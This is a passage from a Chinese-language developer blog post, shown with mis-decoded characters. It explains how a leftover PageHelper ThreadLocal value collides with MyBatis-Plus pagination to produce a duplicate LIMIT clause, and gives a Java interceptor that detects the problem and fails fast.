<p>å…ˆçœ‹çœ‹æ­£å¸¸æƒ…å†µä¸‹ï¼ŒThreadLocal é‡Œçš„åˆ†é¡µä¿¡æ¯æ˜¯æ€ä¹ˆè¢«æ¸…ç†çš„ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph ç¬¬ä¸€å±‚é˜²æŠ¤["ç¬¬ä¸€å±‚é˜²æŠ¤ï¼šPageHelper è‡ªèº«"]
        A[PageHelper.startPage] --&gt; B[è®¾ç½® ThreadLocal]
        B --&gt; C[æ‰§è¡Œ SQL æŸ¥è¯¢]
        C --&gt; D[PageInterceptor.intercept]
        D --&gt; E["finally { clearPage() }"]
        E --&gt; F[æ¸…ç† ThreadLocal]
    end
    
    style ç¬¬ä¸€å±‚é˜²æŠ¤ fill:#e8f5e9,stroke:#4caf50,stroke-width:2px
    style F fill:#c8e6c9,stroke:#388e3c
</code></pre>
<p>PageHelper è‡ªå·±åœ¨ finally é‡Œåšäº†æ¸…ç†ï¼Œæ­£å¸¸æ‰§è¡ŒæŸ¥è¯¢çš„è¯ï¼ŒThreadLocal è‚¯å®šä¼šè¢«æ¸…æ‰ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph ç¬¬äºŒå±‚é˜²æŠ¤["ç¬¬äºŒå±‚é˜²æŠ¤ï¼šTomcat çº¿ç¨‹æ± "]
        G[è¯·æ±‚ç»“æŸ] --&gt; H[çº¿ç¨‹å½’è¿˜çº¿ç¨‹æ± ]
        H --&gt; I{ä¸‹æ¬¡è¢«å¤ç”¨}
        I --&gt; J[å¤§æ¦‚ç‡æ˜¯æ–°çš„ä¸šåŠ¡åœºæ™¯]
        J --&gt; K[ä¸ä¸€å®šä¼šè§¦å‘åˆ†é¡µæŸ¥è¯¢]
    end
    
    style ç¬¬äºŒå±‚é˜²æŠ¤ fill:#e3f2fd,stroke:#2196f3,stroke-width:2px
    style K fill:#bbdefb,stroke:#1976d2
</code></pre>
<p>å°±ç®—ç¬¬ä¸€å±‚æ²¡æ¸…ç†å¹²å‡€ï¼Œçº¿ç¨‹æ± å¤ç”¨çš„æ—¶å€™ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚ä¹Ÿä¸ä¸€å®šä¼šæ‰§è¡Œåˆ†é¡µæŸ¥è¯¢ã€‚å°±ç®—æ‰§è¡Œäº†ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯ MyBatis-Plus çš„ selectPageã€‚</p>
<p>æ‰€ä»¥è¿™ä¸ª bug è¦æš´éœ²ï¼Œéœ€è¦æ»¡è¶³ä¸€è¿ä¸²è‹›åˆ»çš„æ¡ä»¶ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph è§¦å‘æ¡ä»¶["Bug è§¦å‘æ¡ä»¶é“¾"]
        A["startPage è¢«è°ƒç”¨"] --&gt; B["æ²¡æ‰§è¡ŒæŸ¥è¯¢å°±ç»“æŸ"]
        B --&gt; C["ThreadLocal æ®‹ç•™"]
        C --&gt; D["çº¿ç¨‹è¢«å¤ç”¨"]
        D --&gt; E["æ–°è¯·æ±‚ç”¨äº† MBP åˆ†é¡µ"]
        E --&gt; F["ä¸¤ä¸ª LIMIT æ’ä¸€èµ·"]
    end
    
    style è§¦å‘æ¡ä»¶ fill:#fff3e0,stroke:#ff9800,stroke-width:2px
    style F fill:#ffcc80,stroke:#f57c00
</code></pre>
<p>è¿™æ¦‚ç‡ï¼Œéš¾æ€ªä¸‰ä¸ªæœˆæ‰ç¢°ä¸Šã€‚å¹³æ—¶å¯èƒ½ä¹Ÿè§¦å‘äº†ï¼Œä½†å¦‚æœæ˜¯æ™®é€šæŸ¥è¯¢è¢«åŠ äº† LIMITï¼Œå¯èƒ½å°±æ˜¯å°‘è¿”å›äº†å‡ æ¡æ•°æ®ï¼Œæ ¹æœ¬æ²¡äººæ³¨æ„åˆ°ã€‚è¿™æ¬¡æ˜¯ä¸¤ä¸ª LIMIT æ’ä¸€èµ·ç›´æ¥æŠ¥è¯­æ³•é”™è¯¯ï¼Œæ‰è¢«å‘ç°ã€‚</p>
<h3 data-id="heading-5">PageHelper çš„å·¥ä½œåŸç†</h3>
<p>è¿™é‡Œç®€å•è¿‡ä¸€ä¸‹ PageHelper çš„åŸç†ï¼Œä¸ç„¶åé¢çš„åˆ†æçœ‹ä¸æ‡‚ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph ç”¨æˆ·ä»£ç ["ç”¨æˆ·ä»£ç "]
        A["PageHelper.startPage(1, 10)"]
    end
    
    subgraph ThreadLocalå­˜å‚¨["ThreadLocal å­˜å‚¨"]
        B["LOCAL_PAGE.set(page)"]
    end
    
    subgraph MyBatisæ‰§è¡Œ["MyBatis æ‰§è¡Œ"]
        C["æ‰§è¡Œ Mapper æ–¹æ³•"]
        D["PageInterceptor.intercept()"]
    end
    
    subgraph åˆ†é¡µå¤„ç†["åˆ†é¡µå¤„ç†"]
        E{"skip() åˆ¤æ–­"}
        F["éœ€è¦åˆ†é¡µ"]
        G["ä¸éœ€è¦åˆ†é¡µ"]
        H["ç”Ÿæˆ COUNT SQL"]
        I["æ‰§è¡Œ COUNT æŸ¥è¯¢"]
        J["getPageSql() æ‹¼æ¥ LIMIT"]
        K["æ‰§è¡Œåˆ†é¡µæŸ¥è¯¢"]
    end
    
    subgraph æ¸…ç†["æ¸…ç†"]
        L["finally: clearPage()"]
        M["LOCAL_PAGE.remove()"]
    end
    
    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    E --&gt;|"ThreadLocal æœ‰å€¼"| F
    E --&gt;|"ThreadLocal æ— å€¼"| G
    F --&gt; H
    H --&gt; I
    I --&gt; J
    J --&gt; K
    K --&gt; L
    G --&gt; L
    L --&gt; M
    
    style ç”¨æˆ·ä»£ç  fill:#e8f5e9,stroke:#4caf50,stroke-width:2px
    style ThreadLocalå­˜å‚¨ fill:#fff3e0,stroke:#ff9800,stroke-width:2px
    style MyBatisæ‰§è¡Œ fill:#e3f2fd,stroke:#2196f3,stroke-width:2px
    style åˆ†é¡µå¤„ç† fill:#fce4ec,stroke:#e91e63,stroke-width:2px
    style æ¸…ç† fill:#f3e5f5,stroke:#9c27b0,stroke-width:2px
</code></pre>
<p>å…³é”®ç‚¹åœ¨äºï¼š<code>startPage()</code> æŠŠåˆ†é¡µå‚æ•°å­˜åˆ° ThreadLocalï¼Œç„¶åæ‹¦æˆªå™¨åœ¨æ‰§è¡Œ SQL çš„æ—¶å€™è¯»å‡ºæ¥æ‹¼æ¥ LIMITã€‚</p>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œfinally é‡Œä¼šæ¸…ç† ThreadLocalï¼Œæ²¡é—®é¢˜ã€‚</p>
<p>ä½†å¦‚æœ <code>startPage()</code> ä¹‹åã€æŸ¥è¯¢ä¹‹å‰å°±å‡ºé—®é¢˜äº†ï¼ˆå¼‚å¸¸ã€æå‰ returnã€æˆ–è€…åƒæˆ‘ä»¬è¿™æ ·æ ¹æœ¬æ²¡èµ° PageHelper çš„æŸ¥è¯¢ï¼‰ï¼Œé‚£ ThreadLocal å°±æ®‹ç•™ä¸‹æ¥äº†ã€‚</p>
<h3 data-id="heading-6">ç½‘ä¸Šçœ‹åˆ°çš„ä¸€ä¸ªæ–¹æ¡ˆ</h3>
<p>æœé—®é¢˜çš„æ—¶å€™çœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä½œè€…é‡åˆ°çš„åœºæ™¯æ˜¯æŠŠæŸ¥è¯¢æ”¹æˆ ES äº†ï¼Œä½†å¿˜åˆ  <code>startPage()</code>ã€‚ä»–ä»¬çš„è§£å†³æ–¹æ¡ˆæ˜¯åœ¨ Filter æˆ– Dubbo SPI é‡Œç»Ÿä¸€è°ƒç”¨ <code>PageHelper.clearPage()</code>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Controller å±‚åˆ‡é¢</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageHelperAspect</span> {
    <span class="hljs-meta">@Before("execution(* com.xxx.controller..*.*(..))")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearPageBefore</span><span class="hljs-params">()</span> {
        PageHelper.clearPage();
    }
}
</code></pre>
<p>è¿™ä¸ªæ–¹æ¡ˆèƒ½è§£å†³é—®é¢˜ï¼Œåœ¨è¯·æ±‚å…¥å£å¤„å…ˆæ¸…ç†ä¸€ä¸‹ï¼Œç¡®ä¿æ¯ä¸ªè¯·æ±‚æœ‰ä¸ªå¹²å‡€çš„èµ·ç‚¹ã€‚</p>
<p>ä¸è¿‡æˆ‘ä»¬åæ¥é€‰æ‹©äº†å¦ä¸€ä¸ªæ–¹å‘ã€‚</p>
<h3 data-id="heading-7">æˆ‘ä»¬çš„é€‰æ‹©ï¼šä¸»åŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå¤±è´¥</h3>
<p>æˆ‘ä»¬çš„æƒ³æ³•æ˜¯ï¼Œä¸å…¶åˆ°å¤„å…œåº•æ¸…ç†ï¼Œä¸å¦‚è®©é—®é¢˜æ—©æš´éœ²ã€æ—©å‘ç°ã€‚æ¯•ç«Ÿå…œåº•æ¸…ç†è§£å†³çš„æ˜¯ç—‡çŠ¶ï¼Œä»£ç é‡Œçš„é—®é¢˜è¿˜åœ¨é‚£å„¿ã€‚</p>
<p>åšæ³•ä¹Ÿç®€å•ï¼Œå†™ä¸ª MyBatis æ‹¦æˆªå™¨ï¼Œç”¨ JSqlParser è§£æ SQLï¼Œå‘ç°å·²ç»æœ‰ LIMIT äº†ï¼ŒåŒæ—¶ ThreadLocal é‡Œè¿˜æœ‰ PageHelper çš„åˆ†é¡µä¿¡æ¯ï¼Œç›´æ¥æŠ›å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph æ‹¦æˆªå™¨æ£€æµ‹["DuplicateLimitInterceptor"]
        A["intercept è¢«è°ƒç”¨"] --&gt; B{"æ£€æŸ¥ ThreadLocal"}
        B --&gt;|"getLocalPage == null"| C["ç›´æ¥æ”¾è¡Œ"]
        B --&gt;|"å­˜åœ¨åˆ†é¡µä¿¡æ¯"| D["è§£æ SQL"]
        D --&gt; E{"SQL æ˜¯å¦å·²æœ‰ LIMIT"}
        E --&gt;|"æ²¡æœ‰"| C
        E --&gt;|"æœ‰"| F["æŠ›å‡ºå¼‚å¸¸"]
        F --&gt; G["è¾“å‡ºè¯¦ç»†é”™è¯¯ä¿¡æ¯"]
    end
    
    style æ‹¦æˆªå™¨æ£€æµ‹ fill:#ffebee,stroke:#f44336,stroke-width:2px
    style F fill:#ef9a9a,stroke:#c62828
    style G fill:#ef9a9a,stroke:#c62828
    style C fill:#c8e6c9,stroke:#388e3c
</code></pre>
<p>å…·ä½“ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Intercepts({
    @Signature(type = Executor.class, method = "query", 
               args = {MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class})
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DuplicateLimitInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interceptor</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Invocation invocation)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// å…ˆæ£€æŸ¥ ThreadLocal é‡Œæœ‰æ²¡æœ‰ PageHelper çš„åˆ†é¡µä¿¡æ¯</span>
        Page&lt;?&gt; localPage = PageHelper.getLocalPage();
        <span class="hljs-keyword">if</span> (localPage == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> invocation.proceed();
        }
        
        <span class="hljs-comment">// æœ‰çš„è¯ï¼Œè§£æ SQL çœ‹çœ‹æ˜¯ä¸æ˜¯å·²ç»æœ‰ LIMIT äº†</span>
        <span class="hljs-type">MappedStatement</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> (MappedStatement) invocation.getArgs()[<span class="hljs-number">0</span>];
        <span class="hljs-type">Object</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> invocation.getArgs()[<span class="hljs-number">1</span>];
        <span class="hljs-type">BoundSql</span> <span class="hljs-variable">boundSql</span> <span class="hljs-operator">=</span> ms.getBoundSql(parameter);
        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> boundSql.getSql();
        
        <span class="hljs-keyword">if</span> (hasLimitClause(sql)) {
            <span class="hljs-comment">// SQL æœ¬èº«æœ‰ LIMITï¼Œåˆè®¾ç½®äº† PageHelperï¼Œç›´æ¥æŠ¥é”™</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">errorMsg</span> <span class="hljs-operator">=</span> String.format(
                <span class="hljs-string">"æ£€æµ‹åˆ°é‡å¤åˆ†é¡µï¼SQLå·²åŒ…å«LIMITå­å¥ï¼Œä½†ThreadLocalä¸­å­˜åœ¨PageHelperåˆ†é¡µä¿¡æ¯ã€‚\n"</span> +
                <span class="hljs-string">"è¯·æ£€æŸ¥æ˜¯å¦å­˜åœ¨PageHelperä¸MyBatis-Plusæ··ç”¨çš„æƒ…å†µã€‚\n"</span> +
                <span class="hljs-string">"Mapper: %s\n"</span> +
                <span class="hljs-string">"SQL: %s\n"</span> +
                <span class="hljs-string">"ThreadLocal Page: pageNum=%d, pageSize=%d"</span>,
                ms.getId(), sql, localPage.getPageNum(), localPage.getPageSize()
            );
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(errorMsg);
        }
        
        <span class="hljs-keyword">return</span> invocation.proceed();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasLimitClause</span><span class="hljs-params">(String sql)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> CCJSqlParserUtil.parse(sql);
            <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> Select) {
                <span class="hljs-type">Select</span> <span class="hljs-variable">select</span> <span class="hljs-operator">=</span> (Select) stmt;
                <span class="hljs-type">SelectBody</span> <span class="hljs-variable">selectBody</span> <span class="hljs-operator">=</span> select.getSelectBody();
                <span class="hljs-keyword">if</span> (selectBody <span class="hljs-keyword">instanceof</span> PlainSelect) {
                    <span class="hljs-keyword">return</span> ((PlainSelect) selectBody).getLimit() != <span class="hljs-literal">null</span>;
                }
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// è§£æå¤±è´¥å°±ç®—äº†ï¼Œä¸å½±å“æ­£å¸¸æµç¨‹</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">plugin</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-keyword">return</span> Plugin.wrap(target, <span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(Properties properties)</span> {}
}
</code></pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œå¼€å‘é˜¶æ®µå°±èƒ½å‘ç°é—®é¢˜ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-19</span> <span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">33.421</span> ERROR [http<span class="hljs-operator">-</span>nio<span class="hljs-number">-8080</span><span class="hljs-operator">-</span><span class="hljs-keyword">exec</span><span class="hljs-number">-07</span>] c.x.interceptor.DuplicateLimitInterceptor <span class="hljs-operator">-</span> æ£€æµ‹åˆ°é‡å¤åˆ†é¡µï¼
<span class="hljs-keyword">SQL</span>å·²åŒ…å«LIMITå­å¥ï¼Œä½†ThreadLocalä¸­ä»å­˜åœ¨PageHelperåˆ†é¡µä¿¡æ¯ã€‚
è¯·æ£€æŸ¥æ˜¯å¦å­˜åœ¨PageHelperä¸MyBatis<span class="hljs-operator">-</span>Plusæ··ç”¨çš„æƒ…å†µã€‚
Mapper: com.xxx.mapper.OrderMapper.selectPage
<span class="hljs-keyword">SQL</span>: <span class="hljs-keyword">SELECT</span> id, order_no, user_id, amount, status, create_time <span class="hljs-keyword">FROM</span> t_order <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> ?
ThreadLocal Page: pageNum<span class="hljs-operator">=</span><span class="hljs-number">1</span>, pageSize<span class="hljs-operator">=</span><span class="hljs-number">10</span>
</code></pre>
<p>æ¯”çº¿ä¸Šç‚¸äº†å†æ’æŸ¥å¼ºå¤šäº†ã€‚</p>
<h3 data-id="heading-8">é¡ºä¾¿èŠèŠä¸¤ç§åˆ†é¡µæ–¹æ¡ˆçš„åŒºåˆ«</h3>
<p>æ—¢ç„¶è¸©äº†è¿™ä¸ªå‘ï¼Œå°±é¡ºä¾¿è¯´è¯´ PageHelper å’Œ MyBatis-Plus åˆ†é¡µçš„åŒºåˆ«ã€‚</p>
<p><strong>PageHelper çš„æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
List&lt;Order&gt; list = orderMapper.selectList(wrapper);
PageInfo&lt;Order&gt; pageInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageInfo</span>&lt;&gt;(list);
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph PageHelper["PageHelper æ–¹å¼"]
        A["startPage()"] -.-&gt;|"ThreadLocal éšå¼ä¼ é€’"| B["Interceptor"]
        B --&gt; C["æ‹¼æ¥ LIMIT"]
    end
    
    style PageHelper fill:#fff3e0,stroke:#ff9800,stroke-width:2px
</code></pre>
<p>åˆ†é¡µå‚æ•°é€šè¿‡ ThreadLocal ä¼ é€’ï¼Œä¸ç”¨æ”¹æ–¹æ³•ç­¾åï¼Œä¾µå…¥æ€§ä½ã€‚ä½†é—®é¢˜å°±æ˜¯å‰é¢è¯´çš„ï¼ŒThreadLocal ç”¨ä¸å¥½å®¹æ˜“æ³„æ¼ã€‚</p>
<p><strong>MyBatis-Plus çš„æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">Page&lt;Order&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
IPage&lt;Order&gt; result = orderMapper.selectPage(page, wrapper);
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph MyBatisPlus["MyBatis-Plus æ–¹å¼"]
        A["Page å¯¹è±¡"] --&gt;|"æ–¹æ³•å‚æ•°æ˜¾å¼ä¼ é€’"| B["selectPage()"]
        B --&gt; C["æ‹¼æ¥ LIMIT"]
    end
    
    style MyBatisPlus fill:#e8f5e9,stroke:#4caf50,stroke-width:2px
</code></pre>
<p>åˆ†é¡µå‚æ•°ç›´æ¥ä½œä¸ºæ–¹æ³•å‚æ•°ä¼ è¿›å»ï¼Œè·Ÿç€æ–¹æ³•èµ°ï¼Œä¸å­˜åœ¨æ³„æ¼çš„é—®é¢˜ã€‚</p>
<p>ä»å®‰å…¨æ€§æ¥è¯´ï¼ŒMyBatis-Plus çš„æ–¹å¼æ›´ç¨³å¦¥ã€‚ä½†å¦‚æœé¡¹ç›®é‡Œå·²ç»å¤§é‡ä½¿ç”¨ PageHelper äº†ï¼Œè¿ç§»çš„æ—¶å€™ä¸€å®šè¦å°å¿ƒï¼Œåˆ«åƒæˆ‘ä»¬ä¸€æ ·æ¼åˆ ä»£ç ã€‚</p>
<h3 data-id="heading-9">å‡ ä¸ªè¦æ³¨æ„çš„åœ°æ–¹</h3>
<p>è¸©å®Œè¿™ä¸ªå‘ï¼Œæ€»ç»“å‡ ç‚¹ï¼š</p>
<p><strong><code>startPage()</code> å¿…é¡»ç´§è·ŸæŸ¥è¯¢</strong>ï¼Œä¸­é—´ä¸è¦æœ‰ä»»ä½•å¯èƒ½ return æˆ–æŠ›å¼‚å¸¸çš„é€»è¾‘ã€‚è¿™ç§å†™æ³•å°±æ˜¯åŸ‹é›·ï¼š</p>
<pre><code class="hljs language-java" lang="java">PageHelper.startPage(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
<span class="hljs-keyword">if</span> (someCondition) {
    <span class="hljs-keyword">return</span> Collections.emptyList();  <span class="hljs-comment">// é›·</span>
}
doSomething();  <span class="hljs-comment">// è¿™é‡ŒæŠ›å¼‚å¸¸ä¹Ÿæ˜¯é›·</span>
<span class="hljs-keyword">return</span> mapper.selectList();
</code></pre>
<p><strong>è¿ç§»çš„æ—¶å€™è¦å½»åº•</strong>ï¼Œåˆ«ç•™å°¾å·´ã€‚å¯ä»¥å…¨å±€æœä¸€ä¸‹ <code>PageHelper.startPage</code>ï¼Œç¡®ä¿éƒ½å¤„ç†å¹²å‡€äº†ã€‚</p>
<p><strong>å¯ä»¥åŠ ä¸ªæ£€æµ‹æ‹¦æˆªå™¨</strong>ï¼Œå°¤å…¶æ˜¯è¿ç§»æœŸé—´ã€‚ç­‰ç¨³å®šäº†å†ä¸‹æ‰ï¼Œå½“ä¸ªä¿é™©ã€‚</p>
<h3 data-id="heading-10">æœ€å</h3>
<p>è¿™ä¸ªé—®é¢˜è¯´å¤§ä¸å¤§ï¼Œè¯´å°ä¹Ÿä¸å°ã€‚çº¿ä¸Šå¦‚æœæ‚„æ‚„å°‘è¿”å›äº†æ•°æ®ï¼Œä¸æŠ¥é”™çš„è¯å¯èƒ½å¾ˆé•¿æ—¶é—´éƒ½å‘ç°ä¸äº†ã€‚å¹¸å¥½æˆ‘ä»¬è¿™æ¬¡æ˜¯ä¸¤ä¸ª LIMIT æ’ä¸€èµ·ç›´æ¥æŠ¥é”™äº†ï¼Œä¸ç„¶è¿˜å¾—æŸ¥æ›´ä¹…ã€‚</p>
<p>å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å‚è€ƒäº†ä¸€ç¯‡æ˜é‡‘ä¸Šçš„æ–‡ç« ï¼Œä½œè€…é‡åˆ°çš„åœºæ™¯æ˜¯æ”¹ ES æŸ¥è¯¢åå¿˜åˆ  <code>startPage()</code>ï¼Œæ’æŸ¥æ€è·¯å†™å¾—æŒºè¯¦ç»†çš„ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹ï¼š<a href="https://juejin.cn/post/7437075300565516288" target="_blank" title="https://juejin.cn/post/7437075300565516288">å‘çˆ¹å•Šï¼Œæ³¨é‡Šæ— ç”¨ä»£ç ç«Ÿä¼šå¯¼è‡´bugï¼åˆè¢«PageHelperå‘äº†</a></p>
<hr/>
<p>ä½ ä»¬é¡¹ç›®é‡Œç”¨çš„ä»€ä¹ˆåˆ†é¡µæ–¹æ¡ˆï¼ŸPageHelper è¿˜æ˜¯ MyBatis-Plusï¼Ÿè¿ç§»è¿‡ç¨‹ä¸­æœ‰æ²¡æœ‰è¸©è¿‡ç±»ä¼¼çš„å‘ï¼Ÿ</p>
<p>å¯¹äºè¿™ç§é—®é¢˜ï¼Œä½ ä»¬å€¾å‘äºå…œåº•æ¸…ç†è¿˜æ˜¯ä¸»åŠ¨æ£€æµ‹ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºèŠèŠä½ çš„çœ‹æ³•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIå­¦ä¹ èŒƒå¼å˜é©ï¼šIlya Sutskeveræœ€æ–°è®¿è°ˆæ­ç¤ºåè§„æ¨¡æ—¶ä»£çš„AIå‘å±•è·¯å¾„â€”ä»ç®—åŠ›ç«äº‰åˆ°ç ”ç©¶ç«äº‰çš„è½¬å‘]]></title>    <link>https://juejin.cn/post/7577031454585569307</link>    <guid>https://juejin.cn/post/7577031454585569307</guid>    <pubDate>2025-11-27T07:28:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577031454585569307" data-draft-id="7577031454585552923" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIå­¦ä¹ èŒƒå¼å˜é©ï¼šIlya Sutskeveræœ€æ–°è®¿è°ˆæ­ç¤ºåè§„æ¨¡æ—¶ä»£çš„AIå‘å±•è·¯å¾„â€”ä»ç®—åŠ›ç«äº‰åˆ°ç ”ç©¶ç«äº‰çš„è½¬å‘"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,èµ„è®¯"/> <meta itemprop="datePublished" content="2025-11-27T07:28:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç®—å®¶è®¡ç®—"/> <meta itemprop="url" content="https://juejin.cn/user/1426490793396571"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIå­¦ä¹ èŒƒå¼å˜é©ï¼šIlya Sutskeveræœ€æ–°è®¿è°ˆæ­ç¤ºåè§„æ¨¡æ—¶ä»£çš„AIå‘å±•è·¯å¾„â€”ä»ç®—åŠ›ç«äº‰åˆ°ç ”ç©¶ç«äº‰çš„è½¬å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1426490793396571/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç®—å®¶è®¡ç®—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:28:36.000Z" title="Thu Nov 27 2025 07:28:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 